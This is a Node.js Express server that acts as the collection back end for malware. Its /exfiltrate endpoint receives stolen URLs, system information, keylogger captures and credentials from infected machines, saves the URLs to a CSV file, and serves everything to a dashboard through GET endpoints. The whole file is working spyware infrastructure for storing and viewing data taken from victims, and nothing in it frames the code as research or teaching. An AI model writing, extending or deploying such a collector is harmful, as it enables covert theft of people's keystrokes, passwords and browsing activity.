import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';


const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json());

var links = new Array();
var system_info;
var keylogger_info;
var credentials = {};

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html")); // Serve the HTML file
});


app.post('/exfiltrate', (req, res) => {
    const { type, data } = req.body;
    if (!type || !data) {
        res.status(400).send('Bad Request: Missing type or data');
        return;
    }

    switch (type) {
        case 'urls':
            const url = data;
//            console.log("Received URL:", url);
            links.push({
              url: url,
              receivedAt: new Date()
            });

            const csvHeader = "receivedAt, url\n";
            const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
            const filePath = path.join(__dirname, "csv/urls.csv");
            fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
            break;
        case 'os':
            system_info = data;
            break;

        case 'keys':
            keylogger_info = data;
            break;

       case 'credentials':
            credentials = data;
            break;


//        default:
//            console.log(`Unknown type: ${type}`);
//            fs.appendFileSync('exfiltrated_data.txt', `Unknown Type: ${type}\n\n`);
//            break;
    }

    res.sendStatus(200);
});



/*

HELPERS

*/

app.get('/get-urls', (req, res) => {
    res.json(links);
});


app.get('/get-os', (req, res) => {
    if (system_info)
        res.json(system_info);
});

app.get('/get-keys', (req, res) => {
    res.json(keylogger_info);
});

app.get('/get-credentials', (req, res) => {
    res.json(credentials);
});

app.listen(PORT, () => {
    console.log(`Server running on: http://localhost:${PORT}/`);
});
